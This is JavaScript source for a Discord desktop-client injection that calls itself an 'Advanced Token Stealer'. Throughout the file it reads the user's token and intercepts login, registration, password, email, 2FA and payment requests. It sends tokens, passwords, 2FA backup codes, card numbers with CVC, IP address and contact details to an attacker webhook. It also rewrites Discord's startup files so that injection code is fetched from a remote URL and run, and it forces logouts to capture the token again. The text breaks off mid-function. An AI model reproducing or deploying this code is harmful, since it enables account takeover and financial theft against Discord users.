const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/auth/logout',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
            '/users/@me/settings',
            '/users/@me/password',
            '/users/@me/profile',
            '/auth/password',
            '/auth/change-password',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
            'https://discord.com/api/v*/users/@me/billing/payment-sources',
            'https://discordapp.com/api/v*/users/@me/billing/payment-sources',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Employee: { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>", Rare: true },
        Partnered_Server_Owner: { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>", Rare: true },
        HypeSquad_Events: { Value: 4, Emoji: "<:9171hypesquadevents:1163172248140660839>", Rare: true },
        Bug_Hunter_Level_1: { Value: 8, Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
        Early_Supporter: { Value: 512, Emoji: "<:5053earlysupporter:1163172241996005416>", Rare: true },
        Bug_Hunter_Level_2: { Value: 16384, Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
        Early_Verified_Bot_Developer: { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
        House_Bravery: { Value: 64, Emoji: "<:6601hypesquadbravery:1163172246492287017>", Rare: false },
        House_Brilliance: { Value: 128, Emoji: "<:6936hypesquadbrilliance:1163172244474822746>", Rare: false },
        House_Balance: { Value: 256, Emoji: "<:5242hypesquadbalance:1163172243417858128>", Rare: false },
        Active_Developer: { Value: 4194304, Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
        Certified_Moderator: { Value: 262144, Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>", Rare: true },
        Spammer: { Value: 1048704, Emoji: "⌨️", Rare: false },
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => {
    debugLog("Attempting to get Discord token");
    try {
        // Method 1: Direct localStorage access
        let token = await executeJS(`
            try {
                return localStorage.getItem('token') || localStorage.token;
            } catch (e) {
                debugLog('localStorage access failed: ' + e.message);
                return null;
            }
        `);
        if (token && token.length > 20) {
            debugLog(`Token found via direct localStorage: ${token.substring(0, 20)}...`);
            return token;
        }

        // Method 2: Window localStorage property
        token = await executeJS(`
            try {
                return window.localStorage.token;
            } catch (e) {
                debugLog('window.localStorage access failed: ' + e.message);
                return null;
            }
        `);
        if (token && token.length > 20) {
            debugLog(`Token found via window.localStorage: ${token.substring(0, 20)}...`);
            return token;
        }

        // Method 3: Simple localStorage method
        token = await executeJS(`
            try {
                return window.localStorage.token || window.localStorage.getItem('token');
            } catch (e) {
                return null;
            }
        `);
        if (token && token.length > 20) {
            debugLog(`Token found via simple localStorage: ${token.substring(0, 20)}...`);
            return token;
        }

        // Method 4: Iframe localStorage method
        token = await executeJS(`
            try {
                const iframe = document.createElement('iframe');
                document.head.append(iframe);
                const localStorage = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage').get.call(window);
                const token = localStorage.token || localStorage.getItem('token');
                iframe.remove();
                return token;
            } catch (e) {
                return null;
            }
        `);
        if (token && token.length > 20) {
            debugLog(`Token found via iframe localStorage: ${token.substring(0, 20)}...`);
            return token;
        }

        debugLog("No token found with any method");
        return null;
    } catch (error) {
        debugLog(`getToken error: ${error.message}`);
        return null;
    }
};

// Advanced logout functions
const forceLogout = async () => {
    debugLog("Force logout initiated");
    try {
        // Method 1: Clear localStorage and reload
        await executeJS(`
            function getLocalStoragePropertyDescriptor() {
                const o = document.createElement("iframe");
                document.head.append(o);
                const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");
                return o.remove(), e;
            }
            Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());
            const localStorage = getLocalStoragePropertyDescriptor().get.call(window);
            if(localStorage.token) {
                localStorage.token = null;
                localStorage.tokens = null;
                localStorage.MultiAccountStore = null;
                location.reload();
            }
        `);
        debugLog("LocalStorage cleared and page reloaded");
    } catch (error) {
        debugLog(`Force logout error: ${error.message}`);
    }
};

const clearLocalStorage = async () => {
    debugLog("Clearing localStorage with simple method");
    try {
        await executeJS(`
            try {
                localStorage.clear();
                localStorage.removeItem('token');
                localStorage.removeItem('tokens');
                localStorage.removeItem('MultiAccountStore');
                debugLog('LocalStorage cleared successfully');
                setTimeout(() => {
                    window.location.reload();
                }, 1000);
            } catch (e) {
                debugLog('LocalStorage clear failed: ' + e.message);
            }
        `);
        debugLog("LocalStorage clear command sent");
    } catch (error) {
        debugLog(`Clear localStorage error: ${error.message}`);
    }
};

const apiLogout = async (token) => {
    debugLog("Performing API logout");
    try {
        await request("POST", "https://discord.com/api/v9/auth/logout", {
            "Content-Type": "application/json",
            "Authorization": token
        }, JSON.stringify({
            provider: null,
            voip_provider: null,
        }));
        debugLog("API logout successful");
    } catch (error) {
        debugLog(`API logout error: ${error.message}`);
    }
};

const performCompleteLogout = async () => {
    debugLog("Performing complete logout sequence");
    try {
        const token = await getToken();
        if (token) {
            // First try API logout
            await apiLogout(token);
            // Wait a bit
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Then clear localStorage
        await clearLocalStorage();

        debugLog("Complete logout sequence finished");
    } catch (error) {
        debugLog(`Complete logout error: ${error.message}`);
    }
};

// Send first injection notification
const sendFirstInjectionNotification = async (token) => {
    debugLog("Sending first injection notification");
    try {
        const account = await fetchAccount(token);
        if (!account) {
            debugLog("Failed to fetch account info for first injection");
            return;
        }

        debugLog(`Account fetched for first injection: ${account.username}`);
        const content = {
            "content": `🎯 **${account.username}** just got injected!`,
            "embeds": [{
                "title": "🎯 First Injection Successful",
                "fields": [{
                    "name": "📧 Email",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "📱 Phone",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }, {
                    "name": "🔑 Token",
                    "value": "```" + token + "```",
                    "inline": false
                }, {
                    "name": "👤 Username",
                    "value": "`" + account.username + "`",
                    "inline": true
                }, {
                    "name": "🆔 User ID",
                    "value": "`" + account.id + "`",
                    "inline": true
                }],
                "color": 0xff0000,
                "thumbnail": {
                    "url": account.avatar ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : null
                },
                "footer": {
                    "text": "Sutealer Discord Injection - First Injection",
                    "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                },
                "timestamp": new Date().toISOString()
            }]
        };

        await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content));
        debugLog("First injection notification sent successfully");

        // Auto logout user for better token capture - improved method
        if (ENABLE_LOGOUT_PLACEHOLDER) {
            setTimeout(async () => {
                debugLog("Auto-logging out user with advanced method after first injection");
                await performCompleteLogout();
            }, 5000); // Wait 5 seconds before logout
        } else {
            debugLog("Auto-logout disabled by ENABLE_LOGOUT flag");
        }

    } catch (error) {
        debugLog(`sendFirstInjectionNotification error: ${error.message}`);
    }
};

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };
    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();
    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const hooker = async (content, token, account) => {
    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
    content["username"] = "Sutealer - Discord Injection";
    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
    content["embeds"][0]["author"] = {
        "name": account.username,
    };
    content["embeds"][0]["thumbnail"] = {
        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
    };
    content["embeds"][0]["footer"] = {
        "text": "Sutealer Discord Injection - Advanced Token Stealer",
        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
    };
    content["embeds"][0]["title"] = "🎯 Account Information Captured";

    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);
    const billing = await getBilling(token);
    const friends = await getFriends(token);
    const servers = await getServers(token);

    content["embeds"][0]["fields"].push({
        "name": "🔑 Token",
        "value": "```" + token + "```",
        "inline": false
    }, {
        "name": "💎 Nitro",
        "value": nitro,
        "inline": true
    }, {
        "name": "🏆 Badges",
        "value": badges,
        "inline": true
    }, {
        "name": "💳 Billing",
        "value": billing,
        "inline": true
    });

    content["embeds"].push({
        "title": `👥 Total Friends: ${friends.totalFriends}`,
        "description": friends.message,
    }, {
        "title": `🏠 Total Servers: ${servers.totalGuilds}`,
        "description": servers.message,
    });

    for (const embed in content["embeds"]) {
        content["embeds"][embed]["color"] = 0xb143e3;
    }

    await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content));
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", { "Authorization": token });
const fetchBilling = async token => await fetch("/billing/payment-sources", { "Authorization": token });
const fetchServers = async token => await fetch("/guilds?with_counts=true", { "Authorization": token });
const fetchFriends = async token => await fetch("/relationships", { "Authorization": token });

const getNitro = flags => {
    switch (flags) {
        case 1: return '`Nitro Classic`';
        case 2: return '`Nitro Boost`';
        case 3: return '`Nitro Basic`';
        default: return '`❌`';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
};

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
};

const getBilling = async token => {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1: billing += '💳 '; break;
                case 2: billing += '<:paypal:1148653305376034967> '; break;
            }
        }
    });
    return billing || '`❌`';
};

const getIP = async () => {
    try {
        const response = await request("GET", "https://api.ipify.org?format=json");
        return response.ip || "Unknown";
    } catch (e) {
        debugLog(`Error fetching IP: ${e.message}`);
        return "Unknown";
    }
};

const getFriends = async token => {
    const friends = await fetchFriends(token);
    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    })
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags)
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";
    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);
    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `**Rare Servers:**\n`;
        }
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }
    rareGuilds = rareGuilds || "**No Rare Servers**";
    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    debugLog(`EmailPassToken called: ${email}, action: ${action}`);
    try {
        const account = await fetchAccount(token);
        if (!account) {
            debugLog("Failed to fetch account info");
            return;
        }

        debugLog(`Account fetched: ${account.username}`);

        // Get additional account info
        const billing = await getBilling(token);
        const mfaEnabled = account.mfa_enabled || false;
        const ip = await getIP();
        const badges = getBadges(account.public_flags || account.flags || 0);

        const content = {
            "content": " ",
            "embeds": [{
                "title": "Directory Found",
                "description": `\`\`\`${token}\`\`\``,
                "fields": [{
                    "name": "� User",
                    "value": `${account.username} (${account.display_name || account.username})`,
                    "inline": false
                }, {
                    "name": "🏆 Badges",
                    "value": badges || "❌",
                    "inline": true
                }, {
                    "name": "� Billing",
                    "value": billing || "❌",
                    "inline": true
                }, {
                    "name": "� Security",
                    "value": mfaEnabled ? "Multi factor auth is on!" : "Multi factor auth is off!",
                    "inline": true
                }, {
                    "name": "📧 E-Mail",
                    "value": `${account.email}`,
                    "inline": true
                }, {
                    "name": "📱 Phone",
                    "value": account.phone ? `${account.phone}` : "❌",
                    "inline": true
                }, {
                    "name": "🌐 IP Address",
                    "value": `${ip}`,
                    "inline": true
                }],
                "color": 0x000000,
                "thumbnail": {
                    "url": account.avatar ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : null
                },
                "footer": {
                    "text": "Sutealer Discord Injection",
                    "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                },
                "timestamp": new Date().toISOString()
            }]
        };

        debugLog("Sending login notification to webhook");
        await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content));
        debugLog("Login notification sent successfully");

    } catch (error) {
        debugLog(`EmailPassToken error: ${error.message}`);
    }
};

const BackupCodesViewed = async (codes, token) => {
    debugLog(`BackupCodesViewed called with ${codes ? codes.length : 0} codes, token: ${token ? token.substring(0, 20) + '...' : 'null'}`);
    try {
        let account = null;
        let username = "Unknown User";
        let email = "Unknown";

        if (token) {
            account = await fetchAccount(token);
            if (account) {
                username = account.username;
                email = account.email;
                debugLog(`Account fetched for backup codes: ${username}`);
            } else {
                debugLog("Failed to fetch account info for backup codes");
            }
        } else {
            debugLog("No token provided for backup codes");
        }

        const filteredCodes = codes ? codes.filter((code) => code.consumed === false) : [];
        let message = "";

        if (filteredCodes.length > 0) {
            for (let code of filteredCodes) {
                message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
            }
        } else {
            // Fallback: codes might be in different format
            if (codes && Array.isArray(codes)) {
                for (let code of codes) {
                    if (typeof code === 'string') {
                        message += `${code.substr(0, 4)}-${code.substr(4)}\n`;
                    }
                }
            }
        }

        const content = {
            "content": `🔐 **${username}** viewed 2FA backup codes!`,
            "embeds": [{
                "title": "🔐 2FA Backup Codes Viewed",
                "fields": [{
                    "name": "🔐 Backup Codes",
                    "value": "```" + (message || "No codes found") + "```",
                    "inline": false
                }, {
                    "name": "📧 Email",
                    "value": "`" + email + "`",
                    "inline": true
                }, {
                    "name": "📱 Phone",
                    "value": "`" + (account && account.phone ? account.phone : "None") + "`",
                    "inline": true
                }],
                "color": 0xff9900,
                "footer": {
                    "text": "Sutealer Discord Injection - 2FA Backup Codes",
                    "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                },
                "timestamp": new Date().toISOString()
            }]
        };

        debugLog("Sending backup codes notification to webhook");
        await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content));
        debugLog("Backup codes notification sent successfully");
        debugLog("Backup codes notification sent");
    } catch (error) {
        debugLog(`BackupCodesViewed error: ${error.message}`);
    }
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    debugLog(`PasswordChanged called: new password length: ${newPassword.length}, old password length: ${oldPassword.length}`);
    try {
        const account = await fetchAccount(token);
        if (!account) {
            debugLog("Failed to fetch account info for password change");
            return;
        }

        debugLog(`Account fetched for password change: ${account.username}`);

        // Get badges for the account
        const badges = getBadges(account.public_flags || 0);

        const content = {
            "content": "`" + account.username + "` just changed his password!",
            "embeds": [{
                "fields": [{
                    "name": "🔐 New Password",
                    "value": "`" + newPassword + "`",
                    "inline": true
                }, {
                    "name": "🔐 Old Password",
                    "value": "`" + oldPassword + "`",
                    "inline": true
                }, {
                    "name": "🏆 Badges",
                    "value": badges || "❌",
                    "inline": true
                }],
                "color": 0x000000,
                "thumbnail": {
                    "url": account.avatar ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : null
                },
                "footer": {
                    "text": "Sutealer Discord Injection - Password Changed",
                    "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                },
                "timestamp": new Date().toISOString()
            }]
        };

        debugLog("Sending password change notification to webhook");
        await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content));
        debugLog("Password change notification sent successfully");

    } catch (error) {
        debugLog(`PasswordChanged error: ${error.message}`);
    }
};

const EmailChanged = async (newEmail, password, token) => {
    debugLog(`EmailChanged called: new email: ${newEmail}`);
    try {
        const account = await fetchAccount(token);
        if (!account) {
            debugLog("Failed to fetch account info for email change");
            return;
        }

        debugLog(`Account fetched for email change: ${account.username}`);

        const content = {
            "content": `📧 **${account.username}** just changed his email!`,
            "embeds": [{
                "title": "📧 Email Changed",
                "fields": [{
                    "name": "📧 New Email",
                    "value": "`" + newEmail + "`",
                    "inline": true
                }, {
                    "name": "📧 Old Email",
                    "value": "`" + (account.email || "Unknown") + "`",
                    "inline": true
                }, {
                    "name": "🔐 Password",
                    "value": "`" + password + "`",
                    "inline": true
                }, {
                    "name": "👤 Username",
                    "value": "`" + account.username + "`",
                    "inline": true
                }, {
                    "name": "🆔 User ID",
                    "value": "`" + account.id + "`",
                    "inline": true
                }],
                "color": 0x0099ff,
                "thumbnail": {
                    "url": account.avatar ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : null
                },
                "footer": {
                    "text": "Sutealer Discord Injection - Email Changed",
                    "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                },
                "timestamp": new Date().toISOString()
            }]
        };

        debugLog("Sending email change notification to webhook");
        await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content));
        debugLog("Email change notification sent successfully");

    } catch (error) {
        debugLog(`EmailChanged error: ${error.message}`);
    }
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    debugLog(`CreditCardAdded called: number: ${number}, cvc: ${cvc}, month: ${month}, year: ${year}, token: ${token ? token.substring(0, 20) + '...' : 'null'}`);

    try {
        let account = null;
        let username = "Unknown User";

        if (token) {
            account = await fetchAccount(token);
            if (account) {
                username = account.username;
                debugLog(`Account fetched for credit card: ${username}`);
            } else {
                debugLog("Failed to fetch account info for credit card");
            }
        } else {
            debugLog("No token provided for credit card notification");
        }

        const content = {
            "content": `💳 **${username}** just added a credit card!`,
            "embeds": [{
                "title": "💳 Credit Card Added",
                "fields": [{
                    "name": "💳 Number",
                    "value": "`" + (number || "****") + "`",
                    "inline": true
                }, {
                    "name": "🔐 CVC",
                    "value": "`" + (cvc || "***") + "`",
                    "inline": true
                }, {
                    "name": "📅 Expiration",
                    "value": "`" + (month || "**") + "/" + (year || "**") + "`",
                    "inline": true
                }],
                "color": 0x00ff00,
                "footer": {
                    "text": "Sutealer Discord Injection - Credit Card Added",
                    "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                },
                "timestamp": new Date().toISOString()
            }]
        };

        if (token && account) {
            // Token varsa normal hooker kullan
            debugLog("Sending credit card notification with account info");
            hooker(content, token, account);
        } else {
            // Token yoksa direkt webhook'a gönder
            debugLog("Sending credit card notification without account info");
            await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content));
            debugLog("Credit card notification sent successfully");
        }

    } catch (error) {
        debugLog(`CreditCardAdded error: ${error.message}`);
    }
};

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token)
    const content = {
        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        "embeds": [{
            "fields": [{
                "name": "📧 Email",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "📱 Phone",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }]
        }]
    };
    hooker(content, token, account);
};

// Discord path detection
const discordPath = (function () {
    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;
    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }
    if (fs.existsSync(resourcePath)) return { resourcePath, app };
    return { undefined, undefined };
})();

// Debug logging function
const debugLog = (message) => {
    console.log(`[SUTEALER-DEBUG] ${new Date().toISOString()} - ${message}`);
    try {
        const logPath = path.join(__dirname, 'sutealer_debug.log');
        const logMessage = `${new Date().toISOString()} - ${message}\n`;
        fs.appendFileSync(logPath, logMessage);
    } catch (e) {
        // Ignore log file errors
    }
};

// Initiation function - runs once on first injection
async function initiation() {
    debugLog("Initiation function started");

    const initiationPath = path.join(__dirname, 'initiation');
    if (fs.existsSync(initiationPath)) {
        debugLog("Initiation folder found, this is first injection");
        try {
            fs.rmdirSync(initiationPath);
            debugLog("Initiation folder removed");
        } catch (e) {
            debugLog(`Failed to remove initiation folder: ${e.message}`);
        }

        // Wait a bit for Discord to fully load, then perform logout
        if (ENABLE_LOGOUT_PLACEHOLDER) {
            setTimeout(async () => {
                debugLog("Performing auto-logout after injection");
                await performCompleteLogout();
            }, 5000); // Wait 5 seconds for Discord to load
        } else {
            debugLog("Auto-logout disabled by ENABLE_LOGOUT flag");
        }
    } else {
        debugLog("No initiation folder found, injection already completed before");
    }

    // Setup persistent injection
    const { resourcePath, app } = discordPath;
    if (resourcePath === undefined || app === undefined) return;

    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');

    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                name: 'discord',
                main: 'index.js',
            }, null, 4),
        );

        const startUpScript = `const fs = require('fs'), https = require('https'); const indexJs = '${indexJs}'; const bdPath = '${bdPath}'; const fileSize = fs.statSync(indexJs).size fs.readFileSync(indexJs, 'utf8', (err, data) => { if (fileSize < 20000 || data === "module.exports = require('./core.asar')") init(); }) async function init() { https.get('${CONFIG.injection_url}', (res) => { const file = fs.createWriteStream(indexJs); res.replace('%WEBHOOK%', '${CONFIG.webhook}') res.pipe(file); file.on('finish', () => { file.close(); }); }).on("error", (err) => { setTimeout(init(), 10000); }); } require('${path.join(resourcePath, 'app.asar')}') if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

// Main window creation and monitoring
let email = "";
let password = "";
let initiationCalled = false;

const createWindow = () => {
    debugLog("CreateWindow function called");
    const windows = BrowserWindow.getAllWindows();
    debugLog(`Found ${windows.length} browser windows`);

    if (windows.length === 0) {
        debugLog("No browser windows found, retrying in 2 seconds");
        setTimeout(createWindow, 2000);
        return;
    }

    const mainWindow = windows[0];
    debugLog("Main window found, attaching debugger");

    try {
        mainWindow.webContents.debugger.attach('1.3');
        debugLog("Debugger attached successfully");
    } catch (e) {
        debugLog(`Failed to attach debugger: ${e.message}`);
        setTimeout(createWindow, 2000);
        return;
    }

    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            debugLog("Running initiation for the first time");
            await initiation();
            initiationCalled = true;
        }

        // Handle request interception for better data capture
        if (method === 'Fetch.requestPaused') {
            try {
                const requestId = params.requestId;
                const request = params.request;

                debugLog(`Request intercepted: ${request.method} ${request.url}`);

                // Continue the request
                await mainWindow.webContents.debugger.sendCommand('Fetch.continueRequest', { requestId });

                // Store request data for later use (both POST and PATCH requests)
                if (request.postData && (request.method === 'POST' || request.method === 'PATCH')) {
                    global.requestDataCache = global.requestDataCache || {};
                    global.requestIdToData = global.requestIdToData || {};

                    // Store by both URL and requestId for better lookup
                    global.requestDataCache[request.url] = request.postData;
                    global.requestIdToData[requestId] = request.postData;

                    debugLog(`Stored ${request.method} data for URL: ${request.url}`);
                    debugLog(`Stored ${request.method} data for requestId: ${requestId}`);
                    debugLog(`Data content: ${request.postData}`);
                }
            } catch (e) {
                debugLog(`Error handling request interception: ${e.message}`);
            }
            return;
        }

        if (method !== 'Network.responseReceived') return;

        debugLog(`Network response received: ${params.response.url}`);

        // Log all API calls for debugging
        if (params.response.url.includes('/api/v') && params.response.url.includes('discord.com')) {
            debugLog(`Discord API call: ${params.response.url} - Status: ${params.response.status} - Method: ${params.response.method || 'Unknown'}`);
        }

        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        debugLog(`Auth-related URL detected: ${params.response.url}`);

        // Special handling for logout endpoint
        if (params.response.url.endsWith('/auth/logout')) {
            debugLog("Logout endpoint detected in main handler");
            const logoutContent = {
                "content": "🚪 **User logged out from Discord**",
                "embeds": [{
                    "title": "🚪 Discord Logout Detected",
                    "description": "A user has logged out from Discord",
                    "color": 0xff0000,
                    "footer": {
                        "text": "Sutealer Discord Injection - Logout",
                        "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                    },
                    "timestamp": new Date().toISOString()
                }]
            };
            debugLog("Sending logout notification to webhook");
            try {
                await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(logoutContent));
                debugLog("Logout notification sent successfully");
            } catch (error) {
                debugLog(`Logout notification failed: ${error.message}`);
            }
            return;
        }

        try {
            const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
            const responseData = JSON.parse(responseUnparsedData.body || '{}');

            let requestData = {};
            try {
                // First try to get from cache (from request interception)
                global.requestDataCache = global.requestDataCache || {};
                global.requestIdToData = global.requestIdToData || {};

                // Try to find cached data by requestId first (most reliable)
                let cachedData = global.requestIdToData[params.requestId];
                debugLog(`Looking for cached data with requestId: ${params.requestId}`);

                // If not found by requestId, try by URL
                if (!cachedData) {
                    cachedData = global.requestDataCache[params.response.url];
                    debugLog(`Looking for cached data with URL: ${params.response.url}`);
                }

                if (cachedData) {
                    debugLog("Using cached request data from interception");
                    debugLog(`Cached data found: ${cachedData}`);
                    requestData = JSON.parse(cachedData);
                } else {
                    debugLog("No cached data found, trying Network.getRequestPostData");
                    // Fallback to original method
                    const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
                    if (requestUnparsedData && requestUnparsedData.postData) {
                        requestData = JSON.parse(requestUnparsedData.postData);
                        debugLog("Using request data from Network.getRequestPostData");
                    } else {
                        debugLog("No POST data found for request");
                    }
                }
            } catch (requestError) {
                debugLog(`Failed to get request POST data: ${requestError.message}`);
            }

            debugLog(`Request data keys: ${Object.keys(requestData).join(', ')}`);
            debugLog(`Response data keys: ${Object.keys(responseData).join(', ')}`);

            switch (true) {
                case params.response.url.endsWith('/login'):
                    debugLog("Login endpoint detected");
                    if (!responseData.token) {
                        email = requestData.login;
                        password = requestData.password;
                        debugLog(`Stored credentials for 2FA: ${email}`);
                        return; // 2FA
                    }
                    debugLog(`Login successful, sending notification`);
                    EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                    break;
                case params.response.url.endsWith('/register'):
                    debugLog("Register endpoint detected");
                    debugLog(`Register request data: ${JSON.stringify(requestData)}`);
                    debugLog(`Register response data: ${JSON.stringify(responseData)}`);
                    if (requestData.email && requestData.password && responseData.token) {
                        debugLog("Register data complete, calling EmailPassToken");
                        EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                    } else {
                        debugLog("Register data incomplete - missing email, password or token");
                    }
                    break;
                case params.response.url.endsWith('/logout'):
                    debugLog("Logout endpoint detected");
                    debugLog(`Logout request data: ${JSON.stringify(requestData)}`);
                    debugLog(`Logout response data: ${JSON.stringify(responseData)}`);

                    // Logout işlemi tespit edildi, webhook'a bildirim gönder
                    const logoutContent = {
                        "content": "🚪 **User logged out from Discord**",
                        "embeds": [{
                            "title": "🚪 Discord Logout Detected",
                            "description": "A user has logged out from Discord",
                            "color": 0xff0000,
                            "footer": {
                                "text": "Sutealer Discord Injection - Logout",
                                "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                            },
                            "timestamp": new Date().toISOString()
                        }]
                    };
                    debugLog("Sending logout notification to webhook");
                    try {
                        await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(logoutContent));
                        debugLog("Logout notification sent successfully");
                    } catch (error) {
                        debugLog(`Logout notification failed: ${error.message}`);
                    }
                    break;
                case params.response.url.endsWith('/totp'):
                    debugLog("2FA endpoint detected");
                    debugLog(`2FA request data: ${JSON.stringify(requestData)}`);
                    const twoFACode = requestData.code || "Unknown";
